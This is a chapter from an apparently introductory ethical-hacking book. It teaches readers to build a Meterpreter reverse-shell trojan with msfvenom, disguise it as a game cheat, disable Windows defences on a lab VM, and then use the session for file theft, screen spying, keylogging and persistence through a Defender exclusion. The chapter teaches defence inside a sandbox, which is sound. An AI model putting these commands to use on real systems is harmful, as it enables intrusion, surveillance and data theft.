<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
	<head>
		<title>Chapter 6: Remote Hacking with Malware</title>
		<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:af29b7b1-e841-4e64-a1ef-e03d2d2c1d42" name="Adept.expected.resource"/>
	</head>
	<body epub:type="bodymatter chapter">
		<section>
			<header>
				<h1 class="chapter"><span class="ChapterNumber"><span epub:type="pagebreak" id="Page_53" title="53"/>6</span><br/><span class="ChapterTitle">Remote Hacking with Malware </span></h1>
			</header>
			<figure class="opener">
				<img alt="" src="image_fi/book_art/chapterart.png"/>
			</figure>
			<p class="ChapterIntro">In this chapter, you’ll learn how attackers use malware over the internet to infect and control all kinds of computing devices from anywhere in the world. Short for <em>malicious software</em>, <em>malware</em> is any software designed to steal or damage data or to disrupt computer systems or users.</p>
			<p>
				If an attacker can trick you into opening a malicious attachment, video, or app, they can take control of your computer, smartphone, or other internet-connected device. To protect yourself, you need to understand how easy it is for a black hat hacker to create a virus and infect your computer. Once a device is infected, the attacker can often see <em>everything</em>—including your files, your keystrokes, your screen, and even what your webcam sees!</p>
			<p>In this chapter, you’ll safely create a virus on your Kali VM and infect your Windows VM across your virtual network. Then you’ll take control of the Windows VM from your Kali workstation and steal data, keystrokes, webcam video, and more—just like an attacker would. You’ll do this responsibly so the malware doesn’t escape your virtual environment. Along the way, you’ll learn to protect yourself from most malware on the internet.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note"><span epub:type="pagebreak" id="Page_54" title="54"/>
				<h2><span class="NoteHead">WARNING</span></h2>
					<p>	Only perform this hack inside a safe virtual machine environment—never across the internet and never on a machine you don’t control. Hacking another person’s computer on a remote network may violate multiple laws and could even land you in prison. The purpose of this hack is to show how easy it is for an attacker to trick you into giving them complete control of your computer and how you can stay safe by stopping an attack before it starts.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<p>
				To perform our hack, we’ll use one of Kali’s most famous tools, Metasploit. The Metasploit Framework is an open source penetration-testing toolkit maintained by computer security company Rapid7. It’s called a framework because it’s a complete software platform for developing, testing, and executing exploits. An <em>exploit</em> is an attack designed to take advantage of a vulnerability in a computer system.</p>
			<p>Metasploit has been called the hacker’s Swiss Army knife because it comes with so many useful tools built in. In fact, Metasploit contains a whopping 2,000 exploits and counting, including ones that target Windows, macOS, Linux, Microsoft Office, Adobe products, most browsers, iOS, Android, and more.</p>
			<h2 id="h1-502000c06-0001">Building Your Own Virus</h2>
			<p class="BodyFirst">We’ll start by building malware on your Kali VM to take over your Windows VM across the PublicNAT network we created in Chapter 3. Specifically, we’ll create a <em>trojan</em>, a type of malware that looks harmless but can give an attacker control of your computer. Trojans are sometimes called <em>remote access trojans</em> <em>(RATs)</em> because they allow an attacker to control the target computer through the internet from anywhere in the world—no physical access needed.</p>
			<p>
				Trojans are typically disguised as files someone would be tempted to download and run, such as a pirated copy of the latest hit song or movie or a cheat for a popular video game. As an example, we’ll call our trojan <em>Fortnite_cheat_mode.exe</em>. Log in to your Kali VM and let’s create some malware! You might be surprised by how easy it is.</p>
			<ol class="decimal">
				<li value="1">In your Kali VM, click the Kali icon in the top left and go to <b>08 - Exploitation Tools</b><span class="MenuArrow">▶</span><b>Metasploit Framework</b>. If you’re asked for the sudo password, enter <code class="bold">kali</code>. The Metasploit Framework console (msfconsole) will start up, typically with a fun piece of ASCII text art at the top, like the one shown in <a href="#figure6-1" id="figureanchor6-1">Figure 6-1</a>.</li>
				<li value="2">You should see a command prompt labeled <code>msf6 &gt;</code>, short for “Metasploit Framework, version 6.” Enter <code class="bold">ip</code> <code class="bold">addr</code> to check your Kali VM’s IP address and make sure it’s connected to the PublicNAT network:
					<pre><code>msf6 &gt; <code class="bold">ip addr</code></code></pre>
			<span epub:type="pagebreak" id="Page_55" title="55"/>
					<figure><img alt="f06001" class="" src="image_fi/502000c06/f06001.png"/><figcaption>
							<p><a id="figure6-1">Figure 6-1</a>: Startup information for the Metasploit Framework console, with the Metasploit <span class="LiteralInCaption"><code>msf</code></span><span class="LiteralInCaption"><code>6</code></span><span class="LiteralInCaption"><code> &gt;</code></span> command prompt at the bottom left</p>
						</figcaption>
					</figure>
					</li>
				<li value="3">Look for a line under the section <code>eth0:</code> that begins with <code>inet</code> followed by an IP address:
					<pre><code>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:23:ff:90 brd ff:ff:ff:ff:ff:ff <b>inet 10.0.9.</b><em>x</em><b>/24 brd 10.0.9.255 scope global noprefixroute eth0</b><b> </b><span aria-label="annotation1" class="CodeAnnotationCode">1</span></code></pre>
					<p class="ListBody">As long as the address begins with <code>10.0.9</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>, you’re on the PublicNAT network you created in Chapter 3 and ready to go. Take note of the IP address; you’ll need to enter it as part of several commands. If you don’t see <code>10.0.9.</code><var>x</var> as your IP address, go back to Chapter 3, <span class="xref" itemid="xref_target_page 26">page 26</span>, to create the PublicNAT network, or <span class="xref" itemid="xref_target_page 27">page 27</span> to connect your Kali VM to it correctly.</p>
					</li>
				<li value="4">Enter the following two lines, replacing the <var>x</var> in the IP address with the number you just looked up:
					<pre><code>msf6 &gt; <code class="bold">msfvenom  -p  windows/meterpreter/reverse_tcp  \</code> &gt; <code class="bold">LHOST=10.0.9.</code><var class="bold">x</var><code class="bold">  -f  exe  -o  ~/Desktop/Fortnite_cheat_mode.exe</code></code></pre>
			</li>
				<li value="5"><span epub:type="pagebreak" id="Page_56" title="56"/>You should now see a file called <em>Fortnite_cheat_mode.exe</em> on your desktop, as shown in <a href="#figure6-2" id="figureanchor6-2">Figure 6-2</a>. If you don’t see the file, open File Explorer and go to <em>/home/kali/Desktop/</em> to find it.</li>
			</ol>
			<figure>
				<img alt="f06002" class="" src="image_fi/502000c06/f06002.png"/>
				<figcaption>
					<p><a id="figure6-2">Figure 6-2</a>: The <span class="LiteralInCaption"><code>msfvenom</code></span> tool creates a trojan named <em>Fortnite_cheat_mode.exe</em> and places it on the desktop (lower-left).</p>
				</figcaption>
			</figure>
			<p>
				You’ve now created your first trojan—nicely done! All it took was the two lines we entered at the <code>msf6 &gt;</code> command prompt in step 4. Actually, it was just one long command, but the backslash (<code>\</code>) at the end of the first line let us continue the command onto the second line.</p>
			<p>
				So what did the command actually do? It told Metasploit’s <code>msfvenom</code> tool to create a piece of malware containing the Meterpreter shell, an interface that will give us command line (shell) control over the Windows VM from Kali. We told the Meterpreter shell where to receive commands from by typing <code class="bold">LHOST=</code> followed by the Kali VM’s IP address. The <code>-f</code> <code>exe</code> option told <code>msfvenom</code> that the format (<code>-f</code>) of the output should be a Windows executable (<code>exe</code>) program file. The <code>-o</code> option told <code>msfvenom</code> the name and location of the file to output: a file called <em>Fortnite_cheat_mode.exe</em> saved to the desktop (<code>~/Desktop/</code>).</p>
			<h3 id="h2-502000c06-0001">Sharing the Malware</h3>
			<p class="BodyFirst">Now that we have a trojan Windows executable file, we need to get it onto your Windows VM. Often an attacker would try sending the trojan by email, but a lot of email programs scan attachments for malware, plus you wouldn’t want to send a trojan through your personal email account anyway. Instead, we’ll create a shared folder that the Windows user can surf to through their web browser.</p>
			<ol class="decimal">
				<li value="1">Enter this command into the msfconsole window to create a folder called <em>share</em> at the default location for a shared web folder on most Linux computers:
					<pre><code>msf6 &gt; <code class="bold">sudo mkdir /var/www/html/share</code></code></pre>
			</li>
				<li value="2"><span epub:type="pagebreak" id="Page_57" title="57"/>Copy the trojan into the new folder:
					<pre><code>msf6 &gt; <code class="bold">sudo cp ~/Desktop/Fortnite_cheat_mode.exe /var/www/html/share</code></code></pre>
			</li>
				<li value="3">Start the Apache web server application so the folder will be accessible through the web:
					<pre><code>msf6 &gt; <code class="bold">sudo service apache2 start</code></code></pre>
			</li>
				<li value="4">To confirm that the trojan is now available for download, open the web browser in your Kali VM and go to <em>http://&lt;10.0.9.x&gt;/share</em>, replacing <em>&lt;10.0.9.x&gt;</em> with your Kali VM’s IP address. You’ll see a web page like the one shown in <a href="#figure6-3" id="figureanchor6-3">Figure 6-3</a>.</li>
			</ol>
			<figure>
				<img alt="f06003" class="" src="image_fi/502000c06/f06003.png"/>
				<figcaption>
					<p><a id="figure6-3">Figure 6-3</a>: Thanks to Kali’s Apache web server, our trojan malware is now available on the (virtual) web!</p>
				</figcaption>
			</figure>
			<h3 id="h2-502000c06-0002">Listening for the Trojan to Phone Home</h3>
			<p class="BodyFirst">We now need to prepare Metasploit to receive incoming connections from infected Windows machines (we sometimes call this <em>phoning home</em>). An incoming connection will let us send malicious commands to control a machine remotely. Typically, an attacker would send a virus email attachment to thousands of potential victims, waiting to see which ones open the attachment and get infected. In our case, we’ll infect only the one Windows <span epub:type="pagebreak" id="Page_58" title="58"/>VM. However, by following these steps, we could receive connections for controlling several infected computers at once just as easily.</p>
			<ol class="decimal">
				<li value="1">Enter this command at the <code>msf6</code> <code>&gt;</code> prompt to tell Metasploit to handle, or accept, multiple incoming connections from infected computers:
					<pre><code>msf6 &gt; <code class="bold">use exploit/multi/handler</code></code></pre>
					<p class="ListBody">The msfconsole prompt will change to let us know the <em>multi/handler</em> exploit is active.</p>
					</li>
				<li value="2">Now tell Metasploit that the Trojan’s <em>payload</em>—that is, the malicious program we’re delivering—is a Meterpreter shell:
					<pre><code>msf6 exploit(multi/handler) &gt; <code class="bold">set PAYLOAD windows/meterpreter/reverse_tcp</code></code></pre>
					<p class="ListBody">The msfconsole will respond with <code>PAYLOAD</code> <code>=&gt;</code> <code>windows/meterpreter/reverse_tcp</code> to let us know the Meterpreter payload has been selected.</p>
					</li>
				<li value="3">Enter your Kali VM’s IP address to indicate the local host where connections will be coming in (remember to fill in the last number):
					<pre><code>msf6 exploit(multi/handler) &gt; <code class="bold">set LHOST </code><var class="bold">10.0.9.x</var></code></pre>
					<p class="ListBody">Metasploit will respond with <code>LHOST =&gt; </code><var>10.0.9.x</var>  to indicate that the local host option is set correctly.</p>
					</li>
				<li value="4">Finally, the moment we’ve been waiting for: launch the exploit!
					<pre><code>msf6 exploit(multi/handler) &gt; <code class="bold">exploit -j </code></code></pre>
					<p class="ListBody">The <code>-j</code> option tells Metasploit to run the handler in the background so you can use the msfconsole while you wait for infected machines to connect to your Kali VM. Metasploit will confirm that the exploit is running in the background, ready to accept incoming connections on <code>10.0.9.</code><var>x</var><code>:4444</code>, or port 4444 on your Kali VM.</p>
					</li>
			</ol>
			<h2 id="h1-502000c06-0002">Infecting Your Windows VM</h2>
			<p class="BodyFirst">Our trojan is primed and ready to go. Now it’s time to infect your Windows VM. First, we’ll disable a couple of Windows security features that would normally make it harder for users to do something stupid like download and open a questionable file from the internet. Then, with those safeguards turned off, that something stupid is exactly what we’ll do.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">WARNING</span></h2>
					<p>
							Never download a virus onto your <em>host</em> computer—<em>even if you’re the one who created the virus!</em>—because you can expose your computer to outside attackers without knowing it.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<p><span epub:type="pagebreak" id="Page_59" title="59"/>Remember, your Windows VM was created for you to practice hacking safely. If you mess it up, such as by infecting it with a trojan, you can simply delete the Windows VM and create a new one. With that in mind, start your Windows 10 VM in VirtualBox, entering the username <code class="bold">IEUser</code> and password <code class="bold">Passw0rd!</code> if prompted, and let’s get going.</p>
			<ol class="decimal">
				<li value="1">Enter <code class="bold">cmd</code> in the Windows/Cortana search bar to find the command prompt. Right-click it and select <b>Run as administrator</b>. In the pop-up window asking if you want to allow this app to make changes to your device, click <b>Yes</b>.</li>
				<li value="2">In the Administrator: Command Prompt window that appears, enter this command to turn off your Windows VM’s firewall:
					<pre><code>C:\Windows\system32&gt; <code class="bold">netsh advfirewall set allprofiles state off</code></code></pre>
					<p class="ListBody">Normally, a <em>firewall </em>would block unwanted or malicious traffic from outside computers, and it can keep your computer from making suspicious connections to malicious servers. After running this command, you might see the pop-up message “Turn on Windows Firewall.” Windows is warning you that it’s dangerous to leave your firewall turned off—and it is!—but that’s what we want for this first remote hack.</p>
					</li>
				<li value="3">Next, we’ll turn off Windows Defender, another safety tool. Enter <code class="bold">virus</code> in the search bar and open the <b>Virus &amp; threat protection</b> settings.</li>
				<li value="4">Click <b>Manage settings</b> and slide the toggle buttons for Real-time protection and Cloud-delivered protection to <b>Off</b>. Windows will ask again if you want to allow this app to make changes to your device. Click <b>Yes</b>. Your Windows 10 VM is now as vulnerable as one-fourth of all PCs on the planet. 
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">NOTE</span></h2>
							<p>	If you have any trouble running the hack, repeat steps 1 through 4 to turn off the firewall and virus protection. For security, Windows 10 automatically turns these features back on after every restart and sometimes even while you’re working.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="5">Open the Edge web browser and go to <em>http://&lt;10.0.9.x&gt;/share/</em>.</li>
				<li value="6">Click your trojan and choose <b>Save</b> to download the file to your Windows VM’s <em>Downloads</em> folder.</li>
				<li value="7">The moment of truth: open the Windows VM’s <em>Downloads</em> folder and double-click the trojan executable file to run it.</li>
				<li value="8">It turns out that Windows 10 PCs have one more layer of virus protection to prevent boneheaded mistakes like the one we just made: Windows Defender SmartScreen will pop up a warning that it “prevented an unrecognized app from starting,” as shown in <a href="#figure6-4" id="figureanchor6-4">Figure 6-4</a>. Click <b>More info</b> and then <b>Run anyway</b>.</li>
			</ol>
			<p><span epub:type="pagebreak" id="Page_60" title="60"/>You’ve now taken control of your first computer! You won’t see anything happen on the Windows VM, but if you switch back to the Kali VM, you should see something like the following in msfconsole:</p>
			<pre><code>[*] Sending stage (179779 bytes) to 10.0.9.5
[*] Meterpreter session 1 opened (10.0.9.4:4444 -&gt; 10.0.9.5:49830) at 2021-06-11 12:39:46 -0400</code></pre>
			<p>
				The infected Windows VM called back to Kali and established a connection (also called a <em>session</em>). Congratulations: the Windows VM is now awaiting your commands!</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">NOTE</span></h2>
					<p>
							If you don’t get a session message in Kali, first try downloading and running the trojan file again. Turn off the Windows firewall and real-time virus protection again if needed. Make sure both VMs are connected to the same network. Under Settings<span class="MenuArrow">▶</span>Network for each VM in the VirtualBox Manager, confirm that Attached to is set to NAT and that Network is set to PublicNAT. If the trojan still can’t phone home, reboot both VMs and repeat all the steps in this chapter. It’s worth the extra work to get it right.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<figure>
				<img alt="f06004a" class="" src="image_fi/502000c06/f06004a.png"/>
				<figcaption>
					<p><a id="figure6-4">Figure 6-4</a>: Windows Defender SmartScreen tries to protect your Windows VM one last time.</p>
				</figcaption>
			</figure>
			<h2 id="h1-502000c06-0003"><span epub:type="pagebreak" id="Page_61" title="61"/>Controlling Your Windows VM with Meterpreter</h2>
			<p class="BodyFirst">Now that we’ve established a connection between your Kali and Windows VMs, we’re ready to start manipulating the Windows machine from Metasploit. To begin, enter <code class="bold">sessions</code> in the Metasploit terminal window to see the list of active Metasploit connections:</p>
			<pre><code>msf6 exploit(multi/handler) &gt; <b>sessions</b>
Active sessions
=============== Id  Name  Type                     Information                       Connection --  ----  ----                     -----------                       ---------- 1         meterpreter x86/windows  MSEDGEWIN10\IEUser @ MSEDGEWIN10  10.0.9.4:4444 -&gt; 10.0.9.5:63750 (10.0.9.5)</code></pre>
			<p>
				As you can see, we’re connected to an infected Windows 10 machine named MSEdgeWin10 under a username <em>IEUser</em>—that’s your Windows 10 VM! Our session has an ID number of 1. If you ran the trojan on other machines as well, you’d see multiple sessions listed, each with its own ID number. Similarly, if you have to reestablish the connection with the Windows VM, it’ll be listed with a different ID number, such as 2.</p>
			<p>
				Enter <code class="bold">sessions -i </code><var class="bold">1</var> to start interacting with the Windows VM:</p>
			<pre><code>msf6 exploit(multi/handler) &gt; <b>sessions -i </b><var class="bold">1</var>
[*] Starting interaction with 1...
meterpreter &gt;</code></pre>
			<p>
				The command prompt changes to <code>meterpreter</code> <code>&gt;</code> to indicate that we’re interacting with the Meterpreter shell on the remote Windows VM. Let’s try a few commands. Enter <code class="bold">sysinfo</code> to view some information about the computer, such as its operating system (OS), the system language, and more:</p>
			<pre><code>meterpreter &gt; <b>sysinfo</b>
Computer        : MSEDGEWIN10
OS              : Windows 10 (Build 17763).<em>--snip--</em></code></pre>
			<p>
				Now let’s try another command, <code class="bold">pwd</code>, short for <em>print working directory</em>, to see where the Meterpreter shell is running from:</p>
			<pre><code>meterpreter &gt; <b>pwd</b>
C:\Users\IEUser\Downloads</code></pre>
			<p>
				This tells us that the Meterpreter shell is running from the Windows VM’s <em>Downloads</em> directory—where our trojan is located.</p>
			<p>
				Enter <code class="bold">help</code> to list some of the most common commands you can run on your Windows VM remotely from the Meterpreter shell. There are commands to run programs, terminate running processes, shut down or reboot the remote computer, clear event logs (to cover your tracks while hacking), capture keystrokes, take screenshots, and spy on the remote user’s desktop <span epub:type="pagebreak" id="Page_62" title="62"/>or webcam, just to name a few. In total, there are over 100 commands an attacker could use to take almost complete control of a computer. A partial listing of these commands is shown in <a href="#figure6-5" id="figureanchor6-5">Figure 6-5</a>.</p>
			<p>
				To find out how serious the threat really is, let’s see how easily an attacker could hack our files, keyboard, webcam, and more through an infected file. Not every command we’ll use will work every time you try it; you may have to make multiple attempts. However, exploring the damage these commands can do should motivate you <em>never</em> to install software from a random web page or email attachment.</p>
			<figure>
				<img alt="f06005a" class="" src="image_fi/502000c06/f06005a.png"/>
				<figcaption>
					<p><a id="figure6-5">Figure 6-5</a>: A selection of frighteningly cool Meterpreter commands we can use to control the infected Windows VM</p>
				</figcaption>
			</figure>
			<h3 id="h2-502000c06-0003"><span epub:type="pagebreak" id="Page_63" title="63"/>Viewing and Uploading Files</h3>
			<p class="BodyFirst">We’ll start our exploitation of the Windows VM by browsing the computer’s files and uploading a backup copy of our trojan to the Windows VM.</p>
			<ol class="decimal">
				<li value="1">At the <code>meterpreter &gt;</code> command prompt, enter these commands to change the directory to the infected VM’s <em>Documents</em> folder and list the folder’s contents:
					<pre><code>meterpreter &gt; <code class="bold">cd  ../Documents</code>
meterpreter &gt; <code class="bold">ls</code>
Listing: C:\Users\IEUser\Documents
==================================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2019-03-19 06:49:34 -0400  My Music
40777/rwxrwxrwx   0     dir   2019-03-19 06:49:34 -0400  My Pictures
40777/rwxrwxrwx   0     dir   2019-03-19 06:49:34 -0400  My Videos
40777/rwxrwxrwx   0     dir   2019-03-19 07:29:40 -0400  WindowsPowerShell
100666/rw-rw-rw-  402   fil   2019-03-19 06:49:49 -0400  desktop.ini</code></pre>
					<p class="ListBody">You’ll see folders for music, pictures, videos, and more, just like on any other Windows computer. Attackers can use these commands to browse the target computer and look for interesting files to steal.</p>
					</li>
				<li value="2">Upload a copy of the <em>Fortnite_cheat_mode.exe</em> malware file from your Kali VM into the <em>Documents</em> folder:
					<pre><code>meterpreter &gt; <code class="bold">upload /home/kali/Desktop/Fortnite_cheat_mode.exe </code>
[*] uploading  : /home/kali/Desktop/Fortnite_cheat_mode.exe -&gt; Fortnite_cheat_mode.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/Desktop/Fortnite_cheat_mode.exe -&gt; Fortnite_cheat_mode.exe
[*] uploaded   : /home/kali/Desktop/Fortnite_cheat_mode.exe -&gt; Fortnite_cheat_mode.exe</code></pre>
			</li>
				<li value="3">Switch back to your Windows 10 VM and open your <em>Documents</em> folder. You should see the newly uploaded trojan file, as shown in <a href="#figure6-6" id="figureanchor6-6">Figure 6-6</a>.</li>
			</ol>
			<figure>
				<img alt="f06006" class="" src="image_fi/502000c06/f06006.png"/>
				<figcaption>
					<p><a id="figure6-6">Figure 6-6</a>: We can upload files to the infected Windows 10 VM from Kali.</p>
				</figcaption>
			</figure>
			<p><span epub:type="pagebreak" id="Page_64" title="64"/>Now that you have a backup of the trojan on the Windows VM, you can always copy and paste it from <em>Documents</em> into <em>Downloads</em> if Windows Defender ever starts back up and deletes the trojan in the <em>Downloads</em> folder. Once someone opens a single infected file over the web or through email, an attacker will often upload multiple viruses in different locations on a computer to ensure that they can maintain control of the target machine.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="box">
					<h2>maintain access by adding an exclusion for Meterpreter</h2>
					<p class="BoxBodyFirst">As you work through these hacks, Windows Defender may randomly turn back on and delete your trojan executable. To save yourself some headaches, you can exclude the <em>Downloads</em> and/or <em>Documents</em> folders from antivirus scans. Go to <b>Windows Security</b><span class="MenuArrow">▶</span><b>Virus &amp; threat protection</b><span class="MenuArrow">▶</span><b>Manage settings</b>, scroll down to Exclusions, and click <b>Add or remove exclusions</b>. Click <b>Add an exclusion</b>, select <b>Folder</b> from the drop-down menu, and select your <em>Downloads</em> folder. Windows will ask if you want to allow this app to make changes to your device. Click <b>Yes</b>, and you’ll see the <em>C:\Users\IEUser\Downloads</em> folder added to the Exclusions list. Now your trojan will remain even if Windows Defender comes back on. This is one way an attacker can maintain access to your PC after gaining control with Meterpreter.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<h3 id="h2-502000c06-0004">Downloading Files from the Victim Computer</h3>
			<p class="BodyFirst">The <code>download</code> command in Meterpreter allows you to download a file from the victim computer. To try it out, we’ll create a sample text file on the Windows VM and then steal it.</p>
			<ol class="decimal">
				<li value="1">Enter this command at the <code>meterpreter &gt;</code> prompt to take remote control of the victim computer’s Windows command line terminal, or <em>shell</em>.
					<pre><code>meterpreter &gt; <code class="bold">shell</code>
Process 4952 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.</code></pre>
			</li>
				<li value="2">Now create a file named <em>hacked.txt</em> that contains the text “You’ve been hacked!”
					<pre><code>C:\Users\IEUser\<em>Do</em><em>cument</em><em>s</em><em>&gt;</em> <code class="bold">echo "You've been hacked!" &gt; hacked.txt</code>
echo "You've been hacked!" &gt; hacked.txt</code></pre>
			</li>
				<li value="3">Check the <em>Documents</em> folder on the Windows VM. You should see the <em>hacked.txt</em> file that we just created remotely from Kali.</li>
				<li value="4"><span epub:type="pagebreak" id="Page_65" title="65"/>Back in Kali, exit the Windows shell and return to Meterpreter:
					<pre><code>C:\Users\IEUser\Documents&gt; <code class="bold">exit</code>
exit</code></pre>
			</li>
				<li value="5">Now download the file from Windows onto your Kali VM:
					<pre><code>meterpreter &gt; <code class="bold">download hacked.txt</code>
[*] Downloading: hacked.txt -&gt; hacked.txt
[*] Downloaded 24.00 B of 24.00 B (100.0%): hacked.txt -&gt; hacked.txt
[*] download   : hacked.txt -&gt; hacked.txt</code></pre>
			</li>
				<li value="6">Finally, use the following command to view the file’s contents, our “You’ve been hacked!” message.
					<pre><code>meterpreter &gt;<code class="bold"> cat hacked.txt</code>
"You've been hacked!"</code></pre>
			</li>
			</ol>
			<p>
				We have successfully downloaded a file from the victim’s computer! In this case, it was a file that we created (remotely) from our attacking VM, but a real attacker could download much more important information. Any files the Windows user has access to become downloadable by the attacker when the Windows user runs the Meterpreter trojan: customer lists, family photos, budget spreadsheets, tax forms, bank statements, employee data, medical records, valuable intellectual property, or sensitive files of <em>any</em> kind can be stolen with just a few keystrokes.</p>
			<h3 id="h2-502000c06-0005">Viewing the Victim Computer’s Screen</h3>
			<p class="BodyFirst">Trojans like the Meterpreter shell are often called <em>backdoors</em> because they give the attacker access to your computer in a way that bypasses all your other security measures (including logging in). It’s like sneaking in through the back door of a movie theater. When you clicked the Meterpreter trojan file on your Windows VM, you opened a secret door into your computer that allowed us to upload and download files. But it gets worse: you’ve given our attacking VM a backdoor to view your computer screen, record your keystrokes, and even turn on your webcam! To prove it, we’ll try viewing the Windows VM’s screen from within Kali.</p>
			<ol class="decimal">
				<li value="1">Enter <code class="bold">screenshot -v true</code> into the Meterpreter shell. With this command, an attacker can find out what the user of the victim machine is seeing.
					<pre><code>meterpreter &gt; <b>screenshot -v true</b>
Screenshot saved to: /home/kali/Desktop/<em>kYpTvFbl</em>.jpeg </code></pre>
			</li>
				<li value="2">A window should pop up showing a screenshot from the Windows VM, as shown in <a href="#figure6-7" id="figureanchor6-7">Figure 6-7</a>. <span epub:type="pagebreak" id="Page_66" title="66"/>
				<figure><img alt="f06007" class="" src="image_fi/502000c06/f06007.png"/><figcaption>
							<p><a id="figure6-7">Figure 6-7</a>: Capturing a screenshot from the Windows VM</p>
						</figcaption>
					</figure>
					</li>
				<li value="3">You might even be able to take it one step further and spy on the user’s computer screen in real time. In Meterpreter, enter the <code class="bold">screenshare</code> command:
					<pre><code>meterpreter &gt; <code class="bold">screenshare</code>
[*] Preparing player...
[*] Opening player at:  /home/kali/oDgBGMiY.html
[*] Streaming...</code></pre>
					<p class="ListBody">This command doesn’t always work, and it may slow both your VMs (and your host computer) to a crawl because it attempts to stream real-time video of the Windows 10 VM’s computer screen over the virtual network to the Kali VM. But if it does work, you’ll see the Windows 10 VM’s desktop through a browser window in Kali, as shown in <a href="#figure6-8" id="figureanchor6-8">Figure 6-8</a>.</p>
					</li>
				<li value="4">Switch over to your Windows VM and move some files or windows around, empty the Recycle Bin, or open a web page. If you have multiple monitors or enough room to show both VMs, you can watch everything you do in the Windows VM through the streaming video in the browser in Kali. Creepy, right?</li>
				<li value="5">Click back into the Meterpreter terminal window in Kali and press <span class="KeyCaps">CTRL</span>-C to stop the screenshare.</li>
			</ol>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note"><span epub:type="pagebreak" id="Page_67" title="67"/>
				<h2><span class="NoteHead">NOTE</span></h2>
					<p>
							If the <code>screenshare</code> command doesn’t work the first time you try it or if it freezes up, try again. Remember, not every command will work every time you use it.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<figure>
				<img alt="f06008" class="" src="image_fi/502000c06/f06008.png"/>
				<figcaption>
					<p><a id="figure6-8">Figure 6-8</a>: The <span class="LiteralInCaption"><code>screenshare</code></span> command lets an attacker on Kali spy on your Windows desktop over the internet.</p>
				</figcaption>
			</figure>
			<h3 id="h2-502000c06-0006">Logging Keystrokes</h3>
			<p class="BodyFirst">Once in control of a machine, an attacker can log the user’s every keystroke. This gives the attacker a record of what the user is typing, including searches, commands, passwords, and more. Let’s see how it works.</p>
			<ol class="decimal">
				<li value="1">Type <code class="bold">keyscan_start</code> into the Meterpreter shell to begin recording keystrokes from the target computer:
					<pre><code>meterpreter &gt; <code class="bold">keyscan_start</code>
Starting the keystroke sniffer ...</code></pre>
			</li>
				<li value="2">Switch back to your Windows VM, enter <b>notepad</b> in the search bar, and open the Notepad app.</li>
				<li value="3">Enter this information into Notepad:
					<pre><code><code class="bold">My credit card number is not 1111 1111 1111 1111</code><code class="bold">with an expiration of 11/2028</code><code class="bold">and a cvv of 111</code></code></pre>
					<p class="ListBody">Of course, you should never store sensitive information like this in plaintext on your computer, but many people in the world do.</p>
					</li>
				<li value="4"><span epub:type="pagebreak" id="Page_68" title="68"/>Switch back over to the Kali VM and enter <code class="bold">keyscan_dump</code> to view the logged keystrokes:
					<pre><code>meterpreter &gt; <code class="bold">keyscan_dump</code>
Dumping captured keystrokes...
notepad&lt;CR&gt;
&lt;Shift&gt;My credit card number is not 1111 1111 1111 1111&lt;CR&gt;
with an expiration of 11/2028&lt;CR&gt;
and a cvv of 111&lt;CR&gt;</code></pre>
					<p class="ListBody">Meterpreter captured all of the Windows 10 user’s keystrokes, including special keys like <code>&lt;CR&gt;</code> (short for <em>carriage return</em>, another name for the <span class="KeyCaps">ENTER</span> key). Typing into a text file might seem like an unrealistic example, but you can imagine instead that the user was typing their credit card number into an online shopping site or entering their username and password to log in to their bank’s web portal.</p>
					</li>
				<li value="5">Enter <code class="bold">keyscan_stop</code> in the Meterpreter shell to stop capturing keystrokes from the Windows computer:</li>
			</ol>
			<pre><code>meterpreter &gt;<code> </code><code class="bold">keyscan_stop</code>
Stopping the keystroke sniffer...</code></pre>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">WARNING</span></h2>
					<p>
							Keystroke scanning and webcam spying (discussed next) are two of the nastiest hacking tricks. They’re also two of the <em>noisiest</em>, meaning that they create a lot of network traffic and risk “waking up” Windows Defender or other security tools. If your Meterpreter shell loses its connection, try running the downloaded trojan file again. If that doesn’t work, restart your Windows VM and follow the steps for turning off the Windows Firewall and Windows Defender from <span class="xref" itemid="xref_target_page 76">page 76</span>. Then, close Metasploit, reopen it, and reactivate your trojan, starting with the command <code>use exploit/multi/handler</code>, also on <span class="xref" itemid="xref_target_page 76">page 76</span>.<span class="xref" itemid="xref_target_"/> After entering <code>exploit -j</code> in Meterpreter, switch back to your Windows VM and run the trojan executable. You should be able to reestablish a Meterpreter session. The more times you do this, the better you’ll get at it.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<h3 id="h2-502000c06-0007">Spying Through Webcams</h3>
